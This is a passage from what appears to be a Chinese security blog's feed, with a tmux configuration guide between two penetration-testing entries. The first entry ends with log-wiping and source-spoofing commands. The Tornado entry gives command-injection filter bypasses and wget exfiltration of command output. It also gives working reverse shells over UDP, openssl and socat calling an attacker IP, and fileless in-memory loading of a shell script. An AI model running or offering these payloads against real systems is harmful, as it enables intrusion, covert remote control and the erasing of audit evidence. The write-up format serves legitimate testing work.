class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;securekill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p><pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后呢，iptables得开机启动，并且加载这个规则:</p><pre class="line-numbers language-none"><code class="language-none">systemctl disable firewalld  &#x2F;&#x2F;在centos7 上面防火墙改成这个了yum install iptables-services   &#x2F;&#x2F; 以防万一systemctl enable iptablessystemctl start iptables    &#x2F;&#x2F;启动systemctl status iptables  &#x2F;&#x2F;查看状态service iptables save   &#x2F;&#x2F;设定好规则之后，重启也会生效。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/">https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tmux使用</title>
      <link href="/2019/06/24/tmux.html"/>
      <url>/2019/06/24/tmux.html</url>
      
        <content type="html"><![CDATA[<p>组合键:</p><p>:new&lt;回车&gt;  启动新会话<br>s           列出所有会话<br>w           相当于s的时候展开列表，展开windows<br>$           重命名当前会话</p><p>tmux kill-session -t demo # 关闭demo会话</p><p>他有一个session,windows,panes的概念</p><p>一个session可以有N个windows，N个panes</p><p>如果是最大化利用，那么需要找到一种可以跳来跳去的方法，不管是跳windows还是session。</p><p>一般来说是跳windows，因为windows下有几个不同的panes</p><p>所以，怎么跳最快?</p><p>name不管是pane还是windows，是不是只要有name就可以跳过去，不对，应该是windows之间的跳，因为一组windows就是一组任务。</p><p>一个session里面可以最下面的状态栏可以看到有几个windows，windows的名字如何</p><p>###windows的操作:</p><pre class="line-numbers language-none"><code class="language-none">p  切换到上一个windowsn  切换到下一个widnwos,  重命名窗口.  修改当前窗口编号f  根据关键词搜索windows   这个实际测试可用，可以跳session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###Pane的操作</p><pre class="line-numbers language-none"><code class="language-none">&#123;  向前置换面板&#125;  向后置换面板，这个有意思z  最大化当前的面板，再输入一次就变回去了Esc+1  横着的面板变成竖立状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>###Pane和windows之间的互换<br>比如你当前想把另外一个windows合并到现在的pane里面</p><pre class="line-numbers language-none"><code class="language-none">join-pane -s window01 # 合并名称为window01的窗口的默认（第一个）面板到当前窗口中join-pane -s window01.1 # .1显式指定了第一个面板，.2就是第二个面板(我本地将面板编号起始值设置为1，默认是0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有另外一种方式，通过karabiner，单独在iterm2里面绑定某个组合键盘，比如cap绑定一个Home键，这样tmux的prefix就是单独按一下cap就可以了。</p><p>所以需要两个地方设置:</p><pre class="line-numbers language-none"><code class="language-none">set -g prefix Homeunbind C-bbind-key Home send-prefix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二个地方需要在karabiner里面针对iterm2单独设置一个规则: 即按下cap等于home键。<br>这个是网上的一个例子，可以照着写</p><pre class="line-numbers language-none"><code class="language-none">?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;root&gt;  &lt;appdef&gt;    &lt;appname&gt;PYCHARM&lt;&#x2F;appname&gt;    &lt;equal&gt;com.jetbrains.pycharm&lt;&#x2F;equal&gt;  &lt;&#x2F;appdef&gt;   &lt;item&gt;    &lt;name&gt;custom settings&lt;&#x2F;name&gt;    &lt;item&gt;      &lt;name&gt;Change Functional Keys to F3...F10 for PyCharm&lt;&#x2F;name&gt;      &lt;identifier&gt;remap.app_pycharm_functional2function&lt;&#x2F;identifier&gt;      &lt;only&gt;PYCHARM&lt;&#x2F;only&gt;      &lt;autogen&gt;__KeyToKey__ KeyCode::EXPOSE_ALL, KeyCode::F3&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ KeyCode::DASHBOARD, KeyCode::F4&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ KeyCode::LAUNCHPAD, KeyCode::F4&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::KEYBOARDLIGHT_LOW, KeyCode::F5&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::KEYBOARDLIGHT_HIGH, KeyCode::F6&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::MUSIC_PREV, KeyCode::F7&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::MUSIC_PLAY, KeyCode::F8&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::MUSIC_NEXT, KeyCode::F9&lt;&#x2F;autogen&gt;      &lt;autogen&gt;__KeyToKey__ ConsumerKeyCode::VOLUME_MUTE, KeyCode::F10&lt;&#x2F;autogen&gt;    &lt;&#x2F;item&gt;  &lt;&#x2F;item&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取程序的<code>budnle identifiers</code>:</p><pre class="line-numbers language-none"><code class="language-none">&gt; osascript -e &#39;id of app &quot;WebStorm&quot;&#39;  com.jetbrains.WebStorm  &gt; osascript -e &#39;id of app &quot;Pycharm&quot;&#39;  com.jetbrains.pycharm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tmux的最大化利用是远程服务器的时候，在iterm2里面新开一个标签。可以选择每一个vps一个标签，然后在每一个标签里面利用tmux,w</p><p>可以在iterm2里面修改切换tab是<code>cmd + [</code>，和<code>cmd + ]</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># -- general -------------------------------------------------------------------</span><span class="token builtin class-name">set</span> -g default-terminal <span class="token string">"screen-256color"</span> <span class="token comment"># colors!</span>setw -g xterm-keys on<span class="token builtin class-name">set</span> -s escape-time <span class="token number">10</span>                     <span class="token comment"># faster command sequences</span><span class="token builtin class-name">set</span> -sg repeat-time <span class="token number">600</span>                   <span class="token comment"># increase repeat timeout</span><span class="token builtin class-name">set</span> -s focus-events on<span class="token comment"># Fix Ctrl+Arrow for PuTTY</span><span class="token builtin class-name">set</span> -g terminal-overrides <span class="token string">"xterm*:kLFT5=<span class="token entity" title="\e">\e</span>OD:kRIT5=<span class="token entity" title="\e">\e</span>OC:kUP5=<span class="token entity" title="\e">\e</span>OA:kDN5=<span class="token entity" title="\e">\e</span>OB:smkx@:rmkx@"</span><span class="token comment"># remap prefix from 'C-b' to 'C-a'</span>unbind C-bset-option -g prefix C-dbind-key C-d send-prefix<span class="token builtin class-name">set</span> -g mode-keys <span class="token function">vi</span><span class="token comment"># prefix-C-z causes blankscreen, tmux gets suspended</span>unbind C-z<span class="token builtin class-name">set</span> -q -g status-utf8 on                  <span class="token comment"># expect UTF-8 (tmux &lt; 2.2)</span>setw -q -g utf8 on<span class="token comment"># reload configuration</span><span class="token builtin class-name">bind</span> r source-file ~/.tmux.conf <span class="token punctuation">\</span><span class="token punctuation">;</span> display <span class="token string">'~/.tmux.conf sourced'</span><span class="token comment"># -- display -------------------------------------------------------------------</span><span class="token builtin class-name">set</span> -g base-index <span class="token number">1</span>           <span class="token comment"># start windows numbering at 1</span>setw -g pane-base-index <span class="token number">1</span>     <span class="token comment"># make pane numbering consistent with windows</span>setw -g automatic-rename on   <span class="token comment"># rename window to reflect current program</span><span class="token builtin class-name">set</span> -g renumber-windows on    <span class="token comment"># renumber windows when a window is closed</span><span class="token builtin class-name">set</span> -g set-titles on          <span class="token comment"># set terminal title</span><span class="token builtin class-name">set</span> -g display-panes-time <span class="token number">800</span> <span class="token comment"># slightly longer pane indicators display time</span><span class="token builtin class-name">set</span> -g display-time <span class="token number">1000</span>      <span class="token comment"># slightly longer status messages display time</span><span class="token builtin class-name">set</span> -g status-interval <span class="token number">10</span>     <span class="token comment"># redraw status line every 10 seconds</span><span class="token comment"># clear both screen and history</span><span class="token builtin class-name">bind</span> -n C-l send-keys C-l <span class="token punctuation">\</span><span class="token punctuation">;</span> run <span class="token string">'sleep 0.1'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> clear-history<span class="token comment"># activity</span><span class="token builtin class-name">set</span> -g monitor-activity on<span class="token builtin class-name">set</span> -g visual-activity off<span class="token comment"># -- navigation ----------------------------------------------------------------</span><span class="token comment"># create session</span><span class="token builtin class-name">bind</span> C-c new-session<span class="token comment"># find session</span><span class="token builtin class-name">bind</span> C-f command-prompt -p find-session <span class="token string">'switch-client -t %%'</span><span class="token comment"># split current window horizontally</span><span class="token builtin class-name">bind</span> - split-window -v -c <span class="token string">'#&#123;pane_current_path&#125;'</span><span class="token comment"># split current window vertically</span><span class="token builtin class-name">bind</span> <span class="token punctuation">\</span><span class="token punctuation">\</span> split-window -h -c <span class="token string">'#&#123;pane_current_path&#125;'</span><span class="token comment"># pane navigation</span><span class="token builtin class-name">bind</span> -r h select-pane -L  <span class="token comment"># move left</span><span class="token builtin class-name">bind</span> -r j select-pane -D  <span class="token comment"># move down</span><span class="token builtin class-name">bind</span> -r k select-pane -U  <span class="token comment"># move up</span><span class="token builtin class-name">bind</span> -r l select-pane -R  <span class="token comment"># move right</span><span class="token builtin class-name">bind</span> <span class="token operator">></span> swap-pane -D       <span class="token comment"># swap current pane with the next one</span><span class="token builtin class-name">bind</span> <span class="token operator">&lt;</span> swap-pane -U       <span class="token comment"># swap current pane with the previous one</span><span class="token comment"># pane resizing</span><span class="token builtin class-name">bind</span> -r H resize-pane -L <span class="token number">2</span><span class="token builtin class-name">bind</span> -r J resize-pane -D <span class="token number">2</span><span class="token builtin class-name">bind</span> -r K resize-pane -U <span class="token number">2</span><span class="token builtin class-name">bind</span> -r L resize-pane -R <span class="token number">2</span><span class="token comment"># window navigation</span>unbind nunbind p<span class="token builtin class-name">bind</span> -r C-h previous-window <span class="token comment"># select previous window</span><span class="token builtin class-name">bind</span> -r C-l next-window     <span class="token comment"># select next window</span><span class="token builtin class-name">bind</span> Tab last-window        <span class="token comment"># move to last active window</span><span class="token comment"># -- list choice (tmux &lt; 2.4) --------------------------------------------------</span><span class="token comment"># vi-choice is gone in tmux >= 2.4</span>run -b <span class="token string">'tmux bind -t vi-choice h tree-collapse 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice l tree-expand 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice K start-of-list 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice J end-of-list 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice H tree-collapse-all 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice L tree-expand-all 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-choice Escape cancel 2> /dev/null || true'</span><span class="token comment"># -- edit mode (tmux &lt; 2.4) ----------------------------------------------------</span><span class="token comment"># vi-edit is gone in tmux >= 2.4</span>run -b <span class="token string">'tmux bind -ct vi-edit H start-of-line 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -ct vi-edit L end-of-line 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -ct vi-edit q cancel 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -ct vi-edit Escape cancel 1> /dev/null || true'</span><span class="token comment"># -- copy mode -----------------------------------------------------------------</span><span class="token builtin class-name">bind</span> Enter copy-mode <span class="token comment"># enter copy mode</span>run -b <span class="token string">'tmux bind -t vi-copy v begin-selection 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi v send -X begin-selection 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-copy C-v rectangle-toggle 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi C-v send -X rectangle-toggle 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-copy y copy-selection 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi y send -X copy-selection-and-cancel 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-copy Escape cancel 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi Escape send -X cancel 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-copy H start-of-line 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi H send -X start-of-line 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -t vi-copy L end-of-line 2> /dev/null || true'</span>run -b <span class="token string">'tmux bind -T copy-mode-vi L send -X end-of-line 2> /dev/null || true'</span><span class="token comment"># # copy to Mac OSX clipboard</span><span class="token comment"># if -b 'command -v reattach-to-user-namespace > /dev/null 2>&amp;1' 'bind y run -b "tmux save-buffer - | reattach-to-user-namespace pbcopy"'</span><span class="token comment"># # copy to X11 clipboard</span><span class="token comment"># if -b 'command -v xsel > /dev/null 2>&amp;1' 'bind y run -b "tmux save-buffer - | xsel -i -b"'</span><span class="token comment"># # if -b '! command -v xsel > /dev/null 2>&amp;1 &amp;&amp; command -v xclip > /dev/null 2>&amp;1' 'bind y run -b "tmux save-buffer - | xclip -i -selection clipboard >/dev/null 2>&amp;1"'</span><span class="token comment"># # copy to Windows clipboard</span><span class="token comment"># if -b 'command -v clip.exe > /dev/null 2>&amp;1' 'bind y run -b "tmux save-buffer - | clip.exe"'</span><span class="token comment"># if -b '[ -c /dev/clipboard ]' 'bind y run -b "tmux save-buffer - > /dev/clipboard"'</span><span class="token comment"># -- buffers -------------------------------------------------------------------</span><span class="token builtin class-name">bind</span> b list-buffers  <span class="token comment"># list paste buffers</span><span class="token builtin class-name">bind</span> p paste-buffer  <span class="token comment"># paste from the top paste buffer</span><span class="token builtin class-name">bind</span> P choose-buffer <span class="token comment"># choose which buffer to paste from</span><span class="token comment"># -- better UX -----------------------------------------------------------------</span><span class="token builtin class-name">set</span> -g mouse on<span class="token builtin class-name">set</span> -g history-limit <span class="token number">10000</span> <span class="token comment"># same as terminal itself</span><span class="token builtin class-name">set</span> -g pane-active-border-style <span class="token assign-left variable">bg</span><span class="token operator">=</span>default,fg<span class="token operator">=</span>colour4<span class="token comment"># -- status line --------------------------------------------------------------</span><span class="token builtin class-name">set</span> -g status-position bottom<span class="token builtin class-name">set</span> -g status-justify left<span class="token builtin class-name">set</span> -g status-left-length <span class="token number">200</span><span class="token builtin class-name">set</span> -g status-right-length <span class="token number">200</span><span class="token builtin class-name">set</span> -g status-left <span class="token string">"#[fg=colour16,bg=colour254,bold] ❐ #S #[fg=colour255,bg=colour24,bold] #(free -m | awk '/Mem/&#123;printf(<span class="token variable">$3</span>)&#125;')M  #[fg=colour232,bg=colour33,bold] #(vmstat -SM 1 2|awk 'END &#123;print 100-<span class="token variable">$15</span>&#125;')% "</span><span class="token builtin class-name">set</span> -g status-right <span class="token string">" #&#123;?client_prefix,C-d,&#125; #[fg=colour255,bg=colour24,bold] #&#123;=21:pane_title&#125; #[fg=colour255,bg=colour8,bold] #(uptime | cut -d ',' -f1 | sed 's/\ \ /\ /g') #[fg=colour232,bg=colour249,bold] #(echo #&#123;pane_current_command&#125;) #(ps -o args -p <span class="token variable"><span class="token variable">`</span>pgrep -P <span class="token comment">#&#123;pane_pid&#125;</span><span class="token variable">`</span></span>|grep ssh|cut -d ' ' -f2-)"</span><span class="token builtin class-name">set</span> -g status-style <span class="token assign-left variable">fg</span><span class="token operator">=</span>colour15,bg<span class="token operator">=</span>colour233<span class="token comment"># set -g status-left-style fg=colour255,bg=colour233,bold</span><span class="token comment"># set -g status-right-style fg=colour255,bg=colour233,bold</span><span class="token comment"># -- window status -------------------------------------------------------------</span><span class="token comment"># normal tab</span><span class="token builtin class-name">set</span> -g window-status-format <span class="token string">" #I:#W #F "</span><span class="token comment"># current tab</span><span class="token builtin class-name">set</span> -g window-status-current-format <span class="token string">" #I:#W:#F "</span><span class="token builtin class-name">set</span> -g window-status-current-style <span class="token assign-left variable">fg</span><span class="token operator">=</span>colour15,bg<span class="token operator">=</span>colour233,bold<span class="token comment"># activity in window</span><span class="token builtin class-name">set</span> -g window-status-activity-style <span class="token assign-left variable">fg</span><span class="token operator">=</span>default,underscore<span class="token comment"># bell</span>setw -g window-status-bell-style <span class="token assign-left variable">fg</span><span class="token operator">=</span>colour1,bg<span class="token operator">=</span>colour255,bold<span class="token comment"># messages</span>setw -g message-style <span class="token assign-left variable">fg</span><span class="token operator">=</span>black,bg<span class="token operator">=</span>colour226,bold<span class="token builtin class-name">set</span> -g @plugin <span class="token string">'tmux-plugins/tpm'</span><span class="token builtin class-name">set</span> -g @plugin <span class="token string">'tmux-plugins/tmux-sensible'</span><span class="token comment"># plugins</span><span class="token builtin class-name">set</span> -g @plugin <span class="token string">'tmux-plugins/tmux-resurrect'</span><span class="token builtin class-name">set</span> -g @plugin <span class="token string">'tmux-plugins/tmux-continuum'</span><span class="token builtin class-name">set</span> -g @continuum-save-interval <span class="token string">'0'</span><span class="token builtin class-name">set</span> -g @continuum-restore <span class="token string">'on'</span>run <span class="token string">'~/.tmux/plugins/tpm/tpm'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再安装一个tpm插件:</p><pre class="line-numbers language-none"><code class="language-none">mkdir -p ~&#x2F;.tmux&#x2F;plugins&#x2F;git clone https:&#x2F;&#x2F;github.com&#x2F;tmux-plugins&#x2F;tpm ~&#x2F;.tmux&#x2F;plugins&#x2F;tpmPress prefix + I (capital i, as in Install) to fetch the plugin.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>I</code>安装插件，</p><p>saved a session (prefix + ctrl-s) </p><p>最后的最后，如果是本机macosx，远程是vps，当复制远程vps内容的时候，复制的内容是到了远程主机的buffer，这个时候需要clipper来把远程主机复制到本地，我用的tmux版本是2.1。在mac上的ssh配置文件加上端口转发:</p><pre class="line-numbers language-none"><code class="language-none">RemoteForward 8377 localhost:8377<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置开机启动:</p><pre class="line-numbers language-none"><code class="language-none">sudo cp clipper &#x2F;usr&#x2F;local&#x2F;bincp contrib&#x2F;darwin&#x2F;tcp-port&#x2F;com.wincent.clipper.plist ~&#x2F;Library&#x2F;LaunchAgents&#x2F;launchctl load -w -S Aqua ~&#x2F;Library&#x2F;LaunchAgents&#x2F;com.wincent.clipper.plist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在远程主机的tmux配置加上这样:</p><pre class="line-numbers language-none"><code class="language-none">bind-key -t vi-copy Enter copy-pipe &quot;nc localhost 8377&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以了。</p><p>在使用mosh的情况下，mosh是不支持端口转发的，需要先用ssh端口转发，然后再用mosh链接:</p><pre class="line-numbers language-none"><code class="language-none">Host sandbox  ControlMaster no  ControlPath none  Hostname sandbox.example.comHost sandbox-clipper  ControlMaster no  ControlPath none  ExitOnForwardFailure yes  Hostname sandbox.example.com  RemoteForward 8377 localhost:8377  ssh -N -f sandbox-clippermosh sandbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>clipper的文档讲的超级详细，可以看看。</p><p><a href="https://github.com/wincent/clipper">https://github.com/wincent/clipper</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次测试Tornado</title>
      <link href="/2019/06/18/tornado-pentest.html"/>
      <url>/2019/06/18/tornado-pentest.html</url>
      
        <content type="html"><![CDATA[<p>常见越权测试完了之后，有一个上传文件的地方，上传的文件名存在反射xss，主要记录下任意文件读取和远程命令执行。</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ol><li><p>刚开始测试任意文件读取的时候，找不到要读取的文件，问了开发目录结构才读出来，好蠢。实际可以通过<code>/proc/self/cmdline</code> 查看当前程序的运行参数，可以获取到源代码文件名。</p></li><li><p>一般python开发的时候，根目录可能存在文件: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>之类的文件</p></li></ol><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>读取到源代码之后，中间有不一部分的代码是这样的，接收请求传过来的参数，然后列目录:</p><pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exec_cmd4是开发自己写的函数，通过任意文件读取可以找到函数定义:</p><pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    if not no_print:        logger.debug(cmd)    p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里存在命令注入漏洞，链接: <a href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p><p>抄一下demo代码:</p><pre class="line-numbers language-none"><code class="language-none">import osimport subprocesshost &#x3D; &quot;baidu.com&quot;subprocess.call(&quot;ping -c 1 %s&quot; % host, shell&#x3D;True)os.system(&quot;ping -c 1 %s&quot; % host)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果<code>host=&quot;baidu.com;ls&quot;</code>就可以执行ls了。</p><p>PS: 这里和bash直接执行命令没什么区别，比如:</p><pre class="line-numbers language-none"><code class="language-none">host &#x3D; &quot;baidu.com ls&quot;host &#x3D; &quot;baidu.com|ls&quot;host &#x3D; &quot;baidu.com||ls&quot;host &#x3D; &quot;baidu.com&amp;&amp;ls&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用wget xxxx/<code>whoami|base64</code>,查看http请求日志。</p><h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><pre class="line-numbers language-none"><code class="language-none">subprocess.call([&quot;ping&quot;, &quot;-c&quot;, &quot;1&quot;, host])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>TCP反弹被防火墙拦截，使用udp反弹到53端口可以成功执行命令，但是不稳定，还是被防火墙探测到了：</p><pre class="line-numbers language-none"><code class="language-none">#nc -u -lvp 53#!&#x2F;bin&#x2F;bash exec 3&gt;&#x2F;dev&#x2F;udp&#x2F;127.0.0.1&#x2F;8080exec 2&gt;&amp;3 exec 1&gt;&amp;3 echo Welcom back cat 0&lt;&amp;3 | bash | while read line;do echo $line;done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###命令执行绕过测试</p><pre class="line-numbers language-none"><code class="language-none">aa|wget xyz:8000aa&#96;wget$&#123;IFS&#125;xyz&#96;.sqlaa&#96;wget$IFS$9xyz&#96;.sqlaa&#96;&#123;wget,xyz&#125;&#96;.sql&lt;&gt;$&#123;IFS&#125;$&#123;IFS&#125;$9a&#x3D;c;b&#x3D;at;$a$b $c&#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;c&#39;&#39;at flagc&quot;&quot;at flagc\at fl\ag换行绕过，比如使用\n \t \b在URL里面需要编码: %0a,%0b,%0c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ToDo:</p><p>直接的反弹shell可以被阿里防火墙抓到流量并拦截，上面tcp没反弹出来就是这个原因，UDP的反弹完执行了两下貌似也GG。所以需要一个简单方便的加密shell，加密反弹的shell流量。</p><p>加密的webshell在洗澡的时候想了下，必须要有如下特征:</p><ol><li>尽可能减少对系统的依赖性，如果python需要安装额外的库，pass</li><li>减少文件，最好独立一个文件或者没有</li></ol><p>查了下资料有一个现成的，测试可用:</p><h4 id="加密后门"><a href="#加密后门" class="headerlink" title="加密后门"></a>加密后门</h4><pre class="line-numbers language-none"><code class="language-none">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesListener: openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;Shell: mkfifo &#x2F;tmp&#x2F;s; &#x2F;bin&#x2F;sh -i &lt; &#x2F;tmp&#x2F;s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; &#x2F;tmp&#x2F;s; rm &#x2F;tmp&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="其次成品"><a href="#其次成品" class="headerlink" title="其次成品:"></a>其次成品:</h4><p><a href="https://github.com/JusticeRage/freedomfighting#ershpy">https://github.com/JusticeRage/freedomfighting#ershpy</a><br>生成服务端的配置之后，在客户端直接执行即可，受害主机可以直接内存加载执行，感觉之前下载文件之后执行好蠢:</p><pre class="line-numbers language-none"><code class="language-none">接收端: socat openssl-listen:443,reuseaddr,cert&#x3D;server.pem,cafile&#x3D;client.crt,method&#x3D;TLS1 file:&#96;tty&#96;,raw,echo&#x3D;0受害者: gzip -c ersh.py | base64echo &quot;H4sICPMsblkAA2...&quot; | base64 -d | gunzip | python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="不推荐socat"><a href="#不推荐socat" class="headerlink" title="不推荐socat"></a>不推荐socat</h4><p>因为很多时候目标机器没有socat:</p><pre class="line-numbers language-none"><code class="language-none">openssl req -x509 -sha256 -newkey rsa:4096 -keyout server.pem -out server.pem -days 10000 -nodessocat openssl-connect:$ip:$1,verify&#x3D;0 exec:bash,pty,stderr,setsidsocat &#96;tty&#96;,raw,echo&#x3D;0 openssl-listen:$1,reuseaddr,cert&#x3D;server.pem,verify&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://paper.seebug.org/676/">https://paper.seebug.org/676/</a></li><li><a href="https://hl0rey.github.io/2018/07/19/linux%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95/">https://hl0rey.github.io/2018/07/19/linux%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/pwnhub-web-classroom-django-sql-injection.html">https://www.leavesongs.com/PENETRATION/pwnhub-web-classroom-django-sql-injection.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web的URL Hacking</title>
      <link href="/2019/05/27/web-url-hacking.html"/>
